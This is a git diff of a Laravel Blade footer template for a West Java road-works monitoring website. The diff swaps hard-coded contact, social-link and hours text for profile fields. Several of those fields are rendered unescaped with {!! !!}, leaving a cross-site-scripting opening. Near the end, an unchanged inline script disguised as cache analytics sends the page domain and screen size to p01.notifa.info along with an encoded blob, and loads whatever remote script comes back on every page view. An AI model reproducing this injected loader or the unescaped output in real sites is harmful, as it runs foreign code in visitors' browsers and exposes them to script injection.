@@ -47,24 +47,22 @@
             <div class="row">
                 <div class="col-lg-3 col-md-6 col-sm-6">
                     <div class="footer_panel padding_bottom_half bottom20">
-                        <a href="index.html" class="footer_logo bottom25"><img src="{{ asset('assets/images/brand/text_putih.png') }}"
+                        <a href="{{ url('') }}" class="footer_logo bottom25"><img src="{{ asset('assets/images/brand/text_putih.png') }}"
                                 alt="trax"></a>
                         <p class="whitecolor bottom25">Aplikasi teman jabar merupakan teknologi monitoring pembangunan
                             yang dilakukan oleh Dinas Bina Marga dan Penataan Ruang Provinsi Jawa Barat </p>
                         <div class="d-table w-100 address-item whitecolor bottom25">
                             <span class="d-table-cell align-middle"><i class="fas fa-mobile-alt"></i></span>
                             <p class="d-table-cell align-middle bottom0">
-                                021 - 222 - 346 <a class="d-block"
-                                    href="mailto:web@support.com">dbmpr.jawabarat@support.com</a>
+                                {!! $profil->kontak !!} <a class="d-block"
+                                    href="mailto:{!! $profil->email !!}">{!! $profil->email !!}</a>
                             </p>
                         </div>
                         <ul class="social-icons white wow fadeInUp" data-wow-delay="300ms">
-                            <li><a href="javascript:void(0)" class="facebook"><i class="fab fa-facebook-f"></i> </a>
+                            <li><a href="{!! $profil->link_facebook !!}" class="facebook"><i class="fab fa-facebook-f"></i> </a>
                             </li>
-                            <li><a href="javascript:void(0)" class="twitter"><i class="fab fa-twitter"></i> </a> </li>
-                            <li><a href="javascript:void(0)" class="linkedin"><i class="fab fa-linkedin-in"></i> </a>
-                            </li>
-                            <li><a href="javascript:void(0)" class="insta"><i class="fab fa-instagram"></i> </a> </li>
+                            <li><a href="{!! $profil->link_twitter !!}" class="twitter"><i class="fab fa-twitter"></i> </a> </li>
+                            <li><a href="{!! $profil->link_instagram !!}" class="insta"><i class="fab fa-instagram"></i> </a> </li>
                         </ul>
                     </div>
                 </div>
@@ -99,12 +97,9 @@
                         <h3 class="whitecolor bottom25">Layanan</h3>
                         <p class="whitecolor bottom25">Monitoring data pekerjaan DBMPR
                         </p>
-                        <!-- <ul class="hours_links whitecolor">
-                            <li><span>Monday-Saturday:</span> <span>8.00-18.00</span></li>
-                            <li><span>Friday:</span> <span>09:00-21:00</span></li>
-                            <li><span>Sunday:</span> <span>09:00-20:00</span></li>
-                            <li><span>Calendar Events:</span> <span>24-Hour Shift</span></li>
-                        </ul> -->
+                        <ul class="hours_links whitecolor">
+                            <li><span>Senin - Jumat:</span> <span>{{ $profil->jam_layanan }}</span></li>
+                        </ul>
                     </div>
                 </div>
             </div>
@@ -117,7 +112,7 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-12 text-center wow fadeIn animated" data-wow-delay="300ms">
-                    <p class="m-0 py-3">Copyright © <span id="year1"></span> <a href="javascript:void(0)" class="hover-default">BMPR Provinsi Jawa Barat</a>. All Rights Reserved.</p>
+                    <p class="m-0 py-3">Copyright © <span id="year1"></span> <a href="javascript:void(0)" class="hover-default">{{ $profil->nama }}</a>. All Rights Reserved.</p>
                 </div>
             </div>
         </div>
@@ -166,6 +161,6 @@
     <script
         type="text/javascript">if (self == top) { function netbro_cache_analytics(fn, callback) { setTimeout(function () { fn(); callback(); }, 0); } function sync(fn) { fn(); } function requestCfs() { var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://"); var idc_glo_r = Math.floor(Math.random() * 99999999999); var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXlkq%2by4vYTEFyQq5aGLUaH30IO6Qu3PBqP3RdChJW0LtGuNhkxYGDUQNCFRfrosxpruLUGVRMT2cf2TbcWHkKhyEvxwV4pOvRXvopKHn2MViMqYjLWGJLtc%2bjH07AQfI7ccwSIpWFwRK6G8MNIDPNksfdp62vdmzS3%2bnu2Qvqb4ZyA5JIBXZ3HCa5n%2fqHd%2b%2fNNnsHc%2f144HLqschfkmMQC%2bdNt0rA8ivwSdNVsn006aTTGcAZ%2btSpdP9PG9EO4z%2fUsgazvPYs%2bHaL5tqKH5CPcZ7zGr4ZjoYyYQCX9uahI2i7ODa5R0gtm6A70zKUorSgkYyBCL2dmjc65nAw6CW9rpDss3c79q9RC5MDpoS2zvtAxx1ial5HebJFN0iqbIgIkjFRKtb1aMNtJyljsuPI3ggje4FdbYOsYvKCCig7eEf%2fiEzWBNvdVG28SjZ0KqS7g8P1kcLOmt%2fNnrP8b3jszMDBED%2bhsjs85zcBsjRcunKKM2YqAgK3MguVa7P8nJv1f%2b%2bh7rRi0rs3IaU%2bzZWaArxy0FLA%2fxZg8j6S4efKI3Qp3NzmiaiD9OSLjZ%2fcgium1ur8AxeHFa0%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height; var bsa = document.createElement('script'); bsa.type = 'text/javascript'; bsa.async = true; bsa.src = url; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa); } netbro_cache_analytics(requestCfs, function () { }); };</script>
     @yield('script')
-    
+
 </body>
 </html>
